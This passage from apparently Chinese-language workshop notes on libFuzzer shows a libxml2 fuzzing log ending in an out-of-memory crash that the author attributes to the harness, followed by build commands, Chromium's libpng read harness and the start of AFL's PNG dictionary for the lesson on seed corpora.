class="number">1</span>/<span class="number">1</span> MS: <span class="number">3</span> ShuffleBytes-ShuffleBytes-ChangeByte-</span><br><span class="line">#<span class="number">10</span>NEW    cov: <span class="number">155</span> ft: <span class="number">223</span> corp: <span class="number">3</span>/<span class="number">4</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">2</span> MS: <span class="number">4</span> ChangeBit-ShuffleBytes-ShuffleBytes-InsertByte-</span><br><span class="line">#<span class="number">12</span>NEW    cov: <span class="number">156</span> ft: <span class="number">277</span> corp: <span class="number">4</span>/<span class="number">8</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">2</span> ShuffleBytes-CopyPart-</span><br><span class="line">#<span class="number">13</span>NEW    cov: <span class="number">161</span> ft: <span class="number">282</span> corp: <span class="number">5</span>/<span class="number">12</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> CrossOver-</span><br><span class="line">#<span class="number">20</span>NEW    cov: <span class="number">175</span> ft: <span class="number">302</span> corp: <span class="number">6</span>/<span class="number">14</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">2</span> ChangeByte-ChangeBinInt-</span><br><span class="line">#<span class="number">24</span>NEW    cov: <span class="number">177</span> ft: <span class="number">305</span> corp: <span class="number">7</span>/<span class="number">16</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">4</span> EraseBytes-ChangeBinInt-ChangeBit-InsertByte-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">1</span>]: <span class="number">0x604f00</span> in xmlFAReduceEpsilonTransitions /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/libxml2/xmlregexp.c:<span class="number">1777</span></span><br><span class="line">#<span class="number">28</span>NEW    cov: <span class="number">206</span> ft: <span class="number">336</span> corp: <span class="number">8</span>/<span class="number">19</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">4</span> MS: <span class="number">4</span> ShuffleBytes-ChangeByte-ChangeBit-CMP- DE: <span class="string">&quot;\x01?&quot;</span>-</span><br><span class="line">#<span class="number">32</span>NEW    cov: <span class="number">209</span> ft: <span class="number">343</span> corp: <span class="number">9</span>/<span class="number">21</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">4</span> ManualDict-ShuffleBytes-ShuffleBytes-ChangeBit- DE: <span class="string">&quot;&lt;!&quot;</span>-</span><br><span class="line">#<span class="number">38</span>NEW    cov: <span class="number">210</span> ft: <span class="number">344</span> corp: <span class="number">10</span>/<span class="number">25</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> ChangeByte-</span><br><span class="line">#<span class="number">45</span>NEW    cov: <span class="number">210</span> ft: <span class="number">347</span> corp: <span class="number">11</span>/<span class="number">29</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">2</span> CopyPart-ChangeByte-</span><br><span class="line">#<span class="number">47</span>NEW    cov: <span class="number">211</span> ft: <span class="number">366</span> corp: <span class="number">12</span>/<span class="number">33</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">2</span> CopyPart-ChangeBinInt-</span><br><span class="line">#<span class="number">50</span>NEW    cov: <span class="number">211</span> ft: <span class="number">367</span> corp: <span class="number">13</span>/<span class="number">37</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">3</span> ChangeBinInt-CopyPart-ChangeBinInt-</span><br><span class="line">#<span class="number">57</span>NEW    cov: <span class="number">211</span> ft: <span class="number">388</span> corp: <span class="number">14</span>/<span class="number">40</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">4</span> MS: <span class="number">2</span> ManualDict-CrossOver- DE: <span class="string">&quot;\&quot;\&quot;&quot;</span>-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">1</span>]: <span class="number">0x606d20</span> in xmlFARecurseDeterminism /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/libxml2/xmlregexp.c:<span class="number">2589</span></span><br><span class="line">#<span class="number">64</span>NEW    cov: <span class="number">233</span> ft: <span class="number">421</span> corp: <span class="number">15</span>/<span class="number">43</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">4</span> MS: <span class="number">2</span> ChangeBit-PersAutoDict- DE: <span class="string">&quot;\x01?&quot;</span>-</span><br><span class="line">#<span class="number">66</span>NEW    cov: <span class="number">235</span> ft: <span class="number">426</span> corp: <span class="number">16</span>/<span class="number">47</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">2</span> EraseBytes-PersAutoDict- DE: <span class="string">&quot;\x01?&quot;</span>-</span><br><span class="line">#<span class="number">68</span>REDUCE cov: <span class="number">235</span> ft: <span class="number">426</span> corp: <span class="number">16</span>/<span class="number">46</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">4</span> MS: <span class="number">2</span> ChangeBit-EraseBytes-</span><br><span class="line">#<span class="number">72</span>NEW    cov: <span class="number">236</span> ft: <span class="number">427</span> corp: <span class="number">17</span>/<span class="number">50</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">4</span> ShuffleBytes-PersAutoDict-ShuffleBytes-ShuffleBytes- DE: <span class="string">&quot;\x01?&quot;</span>-</span><br><span class="line">#<span class="number">86</span>REDUCE cov: <span class="number">236</span> ft: <span class="number">427</span> corp: <span class="number">17</span>/<span class="number">48</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">4</span> ChangeByte-ChangeBinInt-CopyPart-EraseBytes-</span><br><span class="line">#<span class="number">92</span>NEW    cov: <span class="number">237</span> ft: <span class="number">431</span> corp: <span class="number">18</span>/<span class="number">49</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">1</span>/<span class="number">4</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">103</span>NEW    cov: <span class="number">237</span> ft: <span class="number">433</span> corp: <span class="number">19</span>/<span class="number">53</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> CopyPart-</span><br><span class="line">#<span class="number">104</span>REDUCE cov: <span class="number">237</span> ft: <span class="number">433</span> corp: <span class="number">19</span>/<span class="number">50</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">1</span>/<span class="number">4</span> MS: <span class="number">1</span> CrossOver-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">1</span>]: <span class="number">0x600e30</span> in xmlFAParseCharClassEsc /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/libxml2/xmlregexp.c:<span class="number">4843</span></span><br><span class="line">#<span class="number">115</span>NEW    cov: <span class="number">243</span> ft: <span class="number">439</span> corp: <span class="number">20</span>/<span class="number">54</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> ChangeByte-</span><br><span class="line">#<span class="number">118</span>NEW    cov: <span class="number">246</span> ft: <span class="number">447</span> corp: <span class="number">21</span>/<span class="number">58</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">3</span> CrossOver-PersAutoDict-ChangeBinInt- DE: <span class="string">&quot;\&quot;\&quot;&quot;</span>-</span><br><span class="line">#<span class="number">134</span>REDUCE cov: <span class="number">249</span> ft: <span class="number">457</span> corp: <span class="number">22</span>/<span class="number">62</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">4</span>/<span class="number">4</span> MS: <span class="number">1</span> CrossOver-</span><br><span class="line">#<span class="number">137</span>REDUCE cov: <span class="number">249</span> ft: <span class="number">460</span> corp: <span class="number">23</span>/<span class="number">64</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">3</span> InsertByte-EraseBytes-PersAutoDict- DE: <span class="string">&quot;\x01?&quot;</span>-</span><br><span class="line">#<span class="number">145</span>NEW    cov: <span class="number">250</span> ft: <span class="number">461</span> corp: <span class="number">24</span>/<span class="number">66</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">3</span> CopyPart-EraseBytes-ChangeBit-</span><br><span class="line">#<span class="number">153</span>NEW    cov: <span class="number">250</span> ft: <span class="number">507</span> corp: <span class="number">25</span>/<span class="number">69</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">31</span>Mb L: <span class="number">3</span>/<span class="number">4</span> MS: <span class="number">3</span> CrossOver-ShuffleBytes-CopyPart-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">1</span>]: <span class="number">0x600890</span> in xmlFAParseCharGroup /home/admin/libfuzzer-workshop/lessons/<span class="number">08</span>/libxml2/xmlregexp.c:<span class="number">5100</span></span><br><span class="line">#<span class="number">165</span>NEW    cov: <span class="number">254</span> ft: <span class="number">511</span> corp: <span class="number">26</span>/<span class="number">71</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">32</span>Mb L: <span class="number">2</span>/<span class="number">4</span> MS: <span class="number">2</span> InsertByte-ManualDict- DE: <span class="string">&quot;[]&quot;</span>-</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">8434</span>==ERROR: AddressSanitizer: allocator is out of memory trying to allocate <span class="number">0x18</span> bytes</span><br><span class="line">==<span class="number">8434</span>==ERROR: AddressSanitizer failed to allocate <span class="number">0x2000</span> (<span class="number">8192</span>) bytes of InternalMmapVector (<span class="type">error</span> code: <span class="number">12</span>)</span><br><span class="line">ERROR: Failed to mmap</span><br><span class="line">MS: <span class="number">4</span> ChangeBit-EraseBytes-PersAutoDict-ChangeBit- DE: <span class="string">&quot;[]&quot;</span>-; base unit: <span class="number">85</span>f707600c5524d8497fd94066e422258633e02f</span><br><span class="line"><span class="number">0x7f</span>,<span class="number">0x5b</span>,<span class="number">0xdd</span>,</span><br><span class="line">\x7f[\xdd</span><br><span class="line">artifact_prefix=<span class="string">&#x27;./&#x27;</span>; Test unit written to ./crash-dffb37701985bd6539dcbcfe2a04661627b040ff</span><br><span class="line">Base64: f1vd</span><br></pre></td></tr></table></figure><p>好家伙，这个harness几秒抛出了crash，说明对于的入口函数的选择至关重要。但这次的异常有点奇怪<code>==8434==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x18 bytes</code>描述说申请超出了内存，也没有SUMMARY对漏洞进行定位。<br>因此我们应该意识到问题是出在了harness上，由于在<code>xml_compile_regexp_fuzzer.cc</code>中使用<code>std::vector&lt;uint8_t&gt; buffer(size + 1, 0);</code>对data进行转储，在样例不断增加的过程中vector超出了扩容的内存限制，从而抛出了crash，这并不是测试函数<code>xmlRegexpCompile</code>函数的问题。<br>在另一个对<code>xmlReadMemory</code>的fuzz还在进行，学长说它fuzz这个函数花了十几个小时才出crash。</p><h4 id="lesson-09-the-importance-of-seed-corpus"><a href="#lesson-09-the-importance-of-seed-corpus" class="headerlink" title="lesson 09(the importance of seed corpus)"></a>lesson 09(the importance of seed corpus)</h4><p>这次我们的目标为开源库libpng，首先对源码进行编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">tar xzf libpng.tgz</span><br><span class="line">cd libpng</span><br><span class="line"></span><br><span class="line"># Disable logging via library build configuration control.</span><br><span class="line">cat scripts/pnglibconf.dfa | sed -e &quot;s/option STDIO/option STDIO disabled/&quot; \</span><br><span class="line">&gt; scripts/pnglibconf.dfa.temp</span><br><span class="line">mv scripts/pnglibconf.dfa.temp scripts/pnglibconf.dfa   #这里把错误消息禁用</span><br><span class="line"></span><br><span class="line"># build the library.</span><br><span class="line">autoreconf -f -i</span><br><span class="line">#1</span><br><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -g -fsanitize=address \</span><br><span class="line">    -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div&quot;</span><br><span class="line"></span><br><span class="line">./configure CC=&quot;clang&quot; CFLAGS=&quot;$FUZZ_CXXFLAGS&quot;</span><br><span class="line">make -j2     </span><br><span class="line"></span><br><span class="line">#2</span><br><span class="line">export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link&quot;</span><br><span class="line">CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \</span><br><span class="line">    CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot;  ./configure</span><br><span class="line">make -j$(nproc)</span><br></pre></td></tr></table></figure><p>workshop给出的是#1的编译策略，没有启用采样分析器，而且 -fsanitize-coverage&#x3D;trace-pc-guard适用在older version的libfuzzer。因此我用的是#2的编译策略，上一个lesson证明这样的编译插桩能有效提高fuzz的效率。<br>提供的harness：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2015 The Chromium Authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PNG_INTERNAL</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;png.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BufState</span> &#123;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">uint8_t</span>* data;</span><br><span class="line">  <span class="type">size_t</span> bytes_left;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PngObjectHandler</span> &#123;</span></span><br><span class="line">  png_infop info_ptr = nullptr;</span><br><span class="line">  png_structp png_ptr = nullptr;</span><br><span class="line">  png_voidp row_ptr = nullptr;</span><br><span class="line">  BufState* buf_state = nullptr;</span><br><span class="line"></span><br><span class="line">  ~PngObjectHandler() &#123;</span><br><span class="line">    <span class="keyword">if</span> (row_ptr &amp;&amp; png_ptr) &#123;</span><br><span class="line">      png_free(png_ptr, row_ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (png_ptr &amp;&amp; info_ptr) &#123;</span><br><span class="line">      png_destroy_read_struct(&amp;png_ptr, &amp;info_ptr, nullptr);</span><br><span class="line">    &#125;</span><br><span class="line">    delete buf_state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">user_read_data</span><span class="params">(png_structp png_ptr, png_bytep data, <span class="type">png_size_t</span> length)</span> &#123;</span><br><span class="line">  BufState* buf_state = static_cast&lt;BufState*&gt;(png_get_io_ptr(png_ptr));</span><br><span class="line">  <span class="keyword">if</span> (length &gt; buf_state-&gt;bytes_left) &#123;</span><br><span class="line">    png_error(png_ptr, <span class="string">&quot;read error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(data, buf_state-&gt;data, length);</span><br><span class="line">  buf_state-&gt;bytes_left -= length;</span><br><span class="line">  buf_state-&gt;data += length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kPngHeaderSize = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Entry point for LibFuzzer.</span></span><br><span class="line"><span class="comment">// Roughly follows the libpng book example:</span></span><br><span class="line"><span class="comment">// http://www.libpng.org/pub/png/book/chapter13.html</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (size &lt; kPngHeaderSize) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; <span class="title function_">v</span><span class="params">(data, data + size)</span>;</span><br><span class="line">  <span class="keyword">if</span> (png_sig_cmp(v.data(), <span class="number">0</span>, kPngHeaderSize)) &#123;</span><br><span class="line">    <span class="comment">// not a PNG.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  PngObjectHandler png_handler;</span><br><span class="line">  png_handler.png_ptr = png_create_read_struct</span><br><span class="line">    (PNG_LIBPNG_VER_STRING, nullptr, nullptr, nullptr);</span><br><span class="line">  <span class="keyword">if</span> (!png_handler.png_ptr) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  png_set_user_limits(png_handler.png_ptr, <span class="number">2048</span>, <span class="number">2048</span>);</span><br><span class="line"></span><br><span class="line">  png_set_crc_action(png_handler.png_ptr, PNG_CRC_QUIET_USE, PNG_CRC_QUIET_USE);</span><br><span class="line"></span><br><span class="line">  png_handler.info_ptr = png_create_info_struct(png_handler.png_ptr);</span><br><span class="line">  <span class="keyword">if</span> (!png_handler.info_ptr) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setting up reading from buffer.</span></span><br><span class="line">  png_handler.buf_state = new BufState();</span><br><span class="line">  png_handler.buf_state-&gt;data = data + kPngHeaderSize;</span><br><span class="line">  png_handler.buf_state-&gt;bytes_left = size - kPngHeaderSize;</span><br><span class="line">  png_set_read_fn(png_handler.png_ptr, png_handler.buf_state, user_read_data);</span><br><span class="line">  png_set_sig_bytes(png_handler.png_ptr, kPngHeaderSize);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// libpng error handling.</span></span><br><span class="line">  <span class="keyword">if</span> (setjmp(png_jmpbuf(png_handler.png_ptr))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reading.</span></span><br><span class="line">  png_read_info(png_handler.png_ptr, png_handler.info_ptr);</span><br><span class="line">  png_handler.row_ptr = png_malloc(</span><br><span class="line">      png_handler.png_ptr, png_get_rowbytes(png_handler.png_ptr,</span><br><span class="line">                                               png_handler.info_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// reset error handler to put png_deleter into scope.</span></span><br><span class="line">  <span class="keyword">if</span> (setjmp(png_jmpbuf(png_handler.png_ptr))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  png_uint_32 width, height;</span><br><span class="line">  <span class="type">int</span> bit_depth, color_type, interlace_type, compression_type;</span><br><span class="line">  <span class="type">int</span> filter_type;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!png_get_IHDR(png_handler.png_ptr, png_handler.info_ptr, &amp;width,</span><br><span class="line">                    &amp;height, &amp;bit_depth, &amp;color_type, &amp;interlace_type,</span><br><span class="line">                    &amp;compression_type, &amp;filter_type)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// This is going to be too slow.</span></span><br><span class="line">  <span class="keyword">if</span> (width &amp;&amp; height &gt; <span class="number">100000000</span> / width)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (width &gt; <span class="number">2048</span> || height &gt; <span class="number">2048</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> passes = png_set_interlace_handling(png_handler.png_ptr);</span><br><span class="line">  png_start_read_image(png_handler.png_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> pass = <span class="number">0</span>; pass &lt; passes; ++pass) &#123;</span><br><span class="line">    <span class="keyword">for</span> (png_uint_32 y = <span class="number">0</span>; y &lt; height; ++y) &#123;</span><br><span class="line">      png_read_row(png_handler.png_ptr,</span><br><span class="line">                   static_cast&lt;png_bytep&gt;(png_handler.row_ptr), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于模糊测试来说，能否写出合适的harness关乎着fuzz最后的结果，我们通常选择涉及内存管理，数据处理等方面的函数作为我们的接口函数去fuzz。<br>这里给出的harness中我们比较容易看到它会首先去通过<code>png_sig_cmp</code>函数去判断输入的data是否符合png的格式，符合才能进入到后面的逻辑中，这一方面是确保data的有效性，同时也提高了数据变异的速率。<br>由于要求输入数据为png的格式，那自然想到使用字典去拼接关键字。这样的想法是正确的，下面比较一下两者的差异：<br>先编译:<code>clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -std=c++11 libpng_read_fuzzer.cc -I libpng libpng/.libs/libpng16.a -fsanitize=fuzzer -lz -o libpng_read_fuzzer</code><br>使用的也是AFL给出的png.dict:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"># Copyright 2016 Google Inc.</span><br><span class="line">#</span><br><span class="line"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="line"># you may not use this file except in compliance with the License.</span><br><span class="line"># You may obtain a copy of the License at</span><br><span class="line">#</span><br><span class="line">#      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line">#</span><br><span class="line"># Unless required by applicable law or agreed to in writing, software</span><br><span class="line"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line"># See the License for the specific language governing permissions and</span><br><span class="line"># limitations under the License.</span><br><span class="line">#</span><br><span class="line">################################################################################</span><br><span class="line">#</span><br><span class="line"># AFL dictionary for PNG images</span><br><span class="line"># -----------------------------</span><br><span class="line">#</span><br><span class="line"># Just the basic, standard-originating sections; does not include vendor</span><br><span class="line"># extensions.</span><br><span class="line">#</span><br><span class="line"># Created by Michal Zalewski &lt;lcamtuf@google.com&gt;</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">header_png=&quot;\x89PNG\x0d\x0a\x1a\x0a&quot;</span><br><span class="line"></span><br><span class="line">section_IDAT=&quot;IDAT&quot;</span><br><span class="line">section_IEND=&quot;IEND&quot;</span><br><span class="line">section_IHDR=&quot;IHDR&quot;</span><br><span class="line">section_PLTE=&quot;PLTE&quot;</span><br><span class="line">section_bKGD=&quot;bKGD&quot;</span><br><span class="line">section_cHRM=&quot;cHRM&quot;</span><br><span class="line">section_fRAc=&quot;fRAc&quot;</span><br><span 